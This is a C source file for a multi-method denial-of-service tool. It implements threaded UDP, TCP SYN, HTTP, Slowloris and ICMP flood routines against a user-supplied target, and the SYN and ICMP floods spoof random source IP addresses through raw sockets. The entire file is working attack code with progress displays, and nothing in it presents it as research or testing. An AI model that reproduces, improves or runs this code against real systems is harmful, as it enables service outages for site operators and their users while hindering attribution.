#include "attack_methods.h"
#include "ascii_art.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <time.h>
#include <errno.h>
#include <curl/curl.h>
#include <fcntl.h>


// ==================== UDP FLOOD ====================
void* udp_flood_worker(void* arg) {
    attack_params_t *params = (attack_params_t*)arg;
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) {
        free(params);
        return NULL;
    }
    
    // Set socket options for performance
    int buf_size = 1024 * 1024;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    fcntl(sockfd, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->target, &serv_addr.sin_addr);
    
    char packet[1024];
    memset(packet, 0x41, sizeof(packet)); // Fill with 'A'
    
    time_t start_time = time(NULL);
    __sync_fetch_and_add(&active_threads, 1);
    
    while(attack_active && (time(NULL) - start_time) < params->duration) {
        if(sendto(sockfd, packet, sizeof(packet), 0,
                 (struct sockaddr*)&serv_addr, sizeof(serv_addr)) > 0) {
            __sync_fetch_and_add(&total_packets_sent, 1);
            __sync_fetch_and_add(&total_bytes_sent, sizeof(packet));
        }
        usleep(1000);
    }
    
    __sync_fetch_and_add(&active_threads, -1);
    close(sockfd);
    free(params);
    return NULL;
}

void start_udp_flood(const char* target, int port, int duration, int threads) {
    printf("\033[1;36m[*] Starting UDP Flood attack...\033[0m\n");
    printf("Target: %s:%d | Duration: %ds | Threads: %d\n", target, port, duration, threads);
    
    attack_active = 1;
    total_packets_sent = 0;
    total_bytes_sent = 0;
    
    pthread_t thread_pool[threads];
    
    for(int i = 0; i < threads; i++) {
        attack_params_t* params = malloc(sizeof(attack_params_t));
        strcpy(params->target, target);
        params->port = port;
        params->duration = duration;
        pthread_create(&thread_pool[i], NULL, udp_flood_worker, params);
        usleep(10000); // Stagger thread creation
    }
    
    // Monitor attack progress
    time_t start_time = time(NULL);
    while(attack_active && (time(NULL) - start_time) < duration) {
        int elapsed = time(NULL) - start_time;
        int remaining = duration - elapsed;
        printf("\r\033[1;33m[*] Attack running: %ds elapsed, %ds remaining | Packets: %lld | Bytes: %lld", 
               elapsed, remaining, total_packets_sent, total_bytes_sent);
        fflush(stdout);
        sleep(1);
    }
    
    attack_active = 0;
    
    // Wait for threads to finish
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    printf("\n\033[1;32m[+] UDP Flood completed successfully!\033[0m\n");
}

// ==================== TCP SYN FLOOD ====================
void* tcp_syn_worker(void* arg) {
    attack_params_t *params = (attack_params_t*)arg;
    
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sockfd < 0) {
        free(params);
        return NULL;
    }
    
    int one = 1;
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->target, &dest_addr.sin_addr);
    
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
    
    time_t start_time = time(NULL);
    __sync_fetch_and_add(&active_threads, 1);
    
    while(attack_active && (time(NULL) - start_time) < params->duration) {
        // Build IP header
        memset(packet, 0, sizeof(packet));
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(packet));
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        
        // Spoof source IP with larger buffer
        char src_ip[20];  // Increased buffer size
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", 
                 rand()%256, rand()%256, rand()%256, rand()%256);
        iph->saddr = inet_addr(src_ip);
        iph->daddr = dest_addr.sin_addr.s_addr;
        
        // Build TCP header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(params->port);
        tcph->seq = htonl(rand() % 4294967295);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        sendto(sockfd, packet, sizeof(packet), 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        __sync_fetch_and_add(&total_packets_sent, 1);
        __sync_fetch_and_add(&total_bytes_sent, sizeof(packet));
        usleep(1000);
    }
    
    __sync_fetch_and_add(&active_threads, -1);
    close(sockfd);
    free(params);
    return NULL;
}

void start_tcp_syn(const char* target, int port, int duration, int threads) {
    printf("\033[1;36m[*] Starting TCP SYN Flood attack...\033[0m\n");
    printf("Target: %s:%d | Duration: %ds | Threads: %d\n", target, port, duration, threads);
    
    attack_active = 1;
    total_packets_sent = 0;
    total_bytes_sent = 0;
    
    pthread_t thread_pool[threads];
    
    for(int i = 0; i < threads; i++) {
        attack_params_t* params = malloc(sizeof(attack_params_t));
        strcpy(params->target, target);
        params->port = port;
        params->duration = duration;
        pthread_create(&thread_pool[i], NULL, tcp_syn_worker, params);
        usleep(10000);
    }
    
    time_t start_time = time(NULL);
    while(attack_active && (time(NULL) - start_time) < duration) {
        int elapsed = time(NULL) - start_time;
        int remaining = duration - elapsed;
        printf("\r\033[1;33m[*] Attack running: %ds elapsed, %ds remaining | Packets: %lld | Bytes: %lld", 
               elapsed, remaining, total_packets_sent, total_bytes_sent);
        fflush(stdout);
        sleep(1);
    }
    
    attack_active = 0;
    
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    printf("\n\033[1;32m[+] TCP SYN Flood completed successfully!\033[0m\n");
}

// ==================== HTTP FLOOD ====================
size_t write_null(void *ptr, size_t size, size_t nmemb, void *userdata) {
    (void)ptr; (void)userdata;
    return size * nmemb;
}

void* http_flood_worker(void* arg) {
    attack_params_t *params = (attack_params_t*)arg;
    
    CURL *curl;
    CURLcode res;
    
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    
    if(!curl) {
        free(params);
        return NULL;
    }
    
    char url[512];
    if(params->port == 80 || params->port == 443) {
        snprintf(url, sizeof(url), "http://%s/", params->target);
    } else {
        snprintf(url, sizeof(url), "http://%s:%d/", params->target, params->port);
    }
    
    // Common user agents
    const char* user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    };
    
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_null);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 0L); // GET requests
    
    time_t start_time = time(NULL);
    __sync_fetch_and_add(&active_threads, 1);
    
    while(attack_active && (time(NULL) - start_time) < params->duration) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, 
                        user_agents[rand() % (sizeof(user_agents)/sizeof(user_agents[0]))]);
        
        res = curl_easy_perform(curl);
        
        if(res == CURLE_OK) {
            __sync_fetch_and_add(&total_packets_sent, 1);
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            __sync_fetch_and_add(&total_bytes_sent, 1000); // Approximate
        }
        
        usleep(50000); // 50ms delay between requests
    }
    
    __sync_fetch_and_add(&active_threads, -1);
    curl_easy_cleanup(curl);
    curl_global_cleanup();
    free(params);
    return NULL;
}

void start_http_flood(const char* target, int port, int duration, int threads) {
    printf("\033[1;36m[*] Starting HTTP Flood attack...\033[0m\n");
    printf("Target: %s:%d | Duration: %ds | Threads: %d\n", target, port, duration, threads);
    
    attack_active = 1;
    total_packets_sent = 0;
    total_bytes_sent = 0;
    
    pthread_t thread_pool[threads];
    
    for(int i = 0; i < threads; i++) {
        attack_params_t* params = malloc(sizeof(attack_params_t));
        strcpy(params->target, target);
        params->port = port;
        params->duration = duration;
        pthread_create(&thread_pool[i], NULL, http_flood_worker, params);
        usleep(10000);
    }
    
    time_t start_time = time(NULL);
    while(attack_active && (time(NULL) - start_time) < duration) {
        int elapsed = time(NULL) - start_time;
        int remaining = duration - elapsed;
        printf("\r\033[1;33m[*] Attack running: %ds elapsed, %ds remaining | Requests: %lld | Traffic: %lld bytes", 
               elapsed, remaining, total_packets_sent, total_bytes_sent);
        fflush(stdout);
        sleep(1);
    }
    
    attack_active = 0;
    
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    printf("\n\033[1;32m[+] HTTP Flood completed successfully!\033[0m\n");
}

// ==================== SLOWLORIS ====================
void* slowloris_worker(void* arg) {
    attack_params_t *params = (attack_params_t*)arg;
    
    time_t start_time = time(NULL);
    __sync_fetch_and_add(&active_threads, 1);
    
    while(attack_active && (time(NULL) - start_time) < params->duration) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0) {
            usleep(1000000);
            continue;
        }
        
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(params->port);
        inet_pton(AF_INET, params->target, &serv_addr.sin_addr);
        
        if(connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            // Send partial HTTP request
            char *partial_request = 
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                "Content-Length: 42\r\n";
            
            char request[1024];
            snprintf(request, sizeof(request), partial_request, params->target);
            send(sockfd, request, strlen(request), 0);
            
            // Keep connection open
            while(attack_active && (time(NULL) - start_time) < params->duration) {
                send(sockfd, "X-a: b\r\n", 8, MSG_NOSIGNAL);
                __sync_fetch_and_add(&total_packets_sent, 1);
                sleep(10); // Send header every 10 seconds
            }
        }
        
        close(sockfd);
    }
    
    __sync_fetch_and_add(&active_threads, -1);
    free(params);
    return NULL;
}

void start_slowloris(const char* target, int port, int duration, int threads) {
    printf("\033[1;36m[*] Starting Slowloris attack...\033[0m\n");
    printf("Target: %s:%d | Duration: %ds | Threads: %d\n", target, port, duration, threads);
    
    attack_active = 1;
    total_packets_sent = 0;
    
    pthread_t thread_pool[threads];
    
    for(int i = 0; i < threads; i++) {
        attack_params_t* params = malloc(sizeof(attack_params_t));
        strcpy(params->target, target);
        params->port = port;
        params->duration = duration;
        pthread_create(&thread_pool[i], NULL, slowloris_worker, params);
        usleep(100000); // Stagger connections
    }
    
    time_t start_time = time(NULL);
    while(attack_active && (time(NULL) - start_time) < duration) {
        int elapsed = time(NULL) - start_time;
        int remaining = duration - elapsed;
        printf("\r\033[1;33m[*] Attack running: %ds elapsed, %ds remaining | Connections: %d", 
               elapsed, remaining, active_threads);
        fflush(stdout);
        sleep(1);
    }
    
    attack_active = 0;
    
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    printf("\n\033[1;32m[+] Slowloris attack completed successfully!\033[0m\n");
}

// ==================== ICMP FLOOD ====================
void* icmp_flood_worker(void* arg) {
    attack_params_t *params = (attack_params_t*)arg;
    
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(sockfd < 0) {
        free(params);
        return NULL;
    }
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, params->target, &dest_addr.sin_addr);
    
    char packet[sizeof(struct iphdr) + sizeof(struct icmphdr)];
    struct iphdr *iph = (struct iphdr*)packet;
    struct icmphdr *icmph = (struct icmphdr*)(packet + sizeof(struct iphdr));
    
    time_t start_time = time(NULL);
    __sync_fetch_and_add(&active_threads, 1);
    
    while(attack_active && (time(NULL) - start_time) < params->duration) {
        memset(packet, 0, sizeof(packet));
        
        // Build IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(packet));
        iph->id = htonl(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_ICMP;
        
        // Spoof source IP with larger buffer
        char src_ip[20];  // Increased buffer size
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", 
                 rand()%256, rand()%256, rand()%256, rand()%256);
        iph->saddr = inet_addr(src_ip);
        iph->daddr = dest_addr.sin_addr.s_addr;
        
        // Build ICMP header (ping request)
        icmph->type = ICMP_ECHO;
        icmph->code = 0;
        icmph->un.echo.id = htons(rand() % 65535);
        icmph->un.echo.sequence = htons(1);
        icmph->checksum = 0;
        
        sendto(sockfd, packet, sizeof(packet), 0, 
               (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        
        __sync_fetch_and_add(&total_packets_sent, 1);
        __sync_fetch_and_add(&total_bytes_sent, sizeof(packet));
        usleep(1000);
    }
    
    __sync_fetch_and_add(&active_threads, -1);
    close(sockfd);
    free(params);
    return NULL;
}

void start_icmp_flood(const char* target, int duration, int threads) {
    printf("\033[1;36m[*] Starting ICMP Flood attack...\033[0m\n");
    printf("Target: %s | Duration: %ds | Threads: %d\n", target, duration, threads);
    
    attack_active = 1;
    total_packets_sent = 0;
    total_bytes_sent = 0;
    
    pthread_t thread_pool[threads];
    
    for(int i = 0; i < threads; i++) {
        attack_params_t* params = malloc(sizeof(attack_params_t));
        strcpy(params->target, target);
        params->port = 0; // Not used for ICMP
        params->duration = duration;
        pthread_create(&thread_pool[i], NULL, icmp_flood_worker, params);
        usleep(10000);
    }
    
    time_t start_time = time(NULL);
    while(attack_active && (time(NULL) - start_time) < duration) {
        int elapsed = time(NULL) - start_time;
        int remaining = duration - elapsed;
        printf("\r\033[1;33m[*] Attack running: %ds elapsed, %ds remaining | ICMP Packets: %lld", 
               elapsed, remaining, total_packets_sent);
        fflush(stdout);
        sleep(1);
    }
    
    attack_active = 0;
    
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    printf("\n\033[1;32m[+] ICMP Flood completed successfully!\033[0m\n");
}
